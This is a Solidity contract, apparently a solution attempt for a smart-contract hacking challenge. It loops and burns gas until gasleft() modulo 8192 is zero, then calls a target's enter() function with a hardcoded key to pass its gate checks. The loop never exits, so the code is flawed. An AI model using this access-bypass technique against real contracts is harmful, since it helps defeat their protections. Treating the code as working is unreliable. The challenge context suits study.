/**
 *Submitted for verification at polygonscan.com on 2022-12-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract gateKeeper {
    address public s_owner;
    address public s_target;

    event errorofcontract(string);

    constructor(address _target) {
        s_target = _target;
        s_owner = msg.sender;
    }

    function tryEnter() public{
        uint a = 0;
        bytes8 _key = bytes8(0xF152e3DcB9f01e7D);
        keeper target = keeper(s_target);
        while(true){ 
        if(gasleft() % 8192 == 0){
            emit errorofcontract("IamIN");
            target.enter(_key);
            
        }else {
            a++;
        }
        }
        
    }
}

interface keeper {

    function enter(bytes8 _key) external;
    
}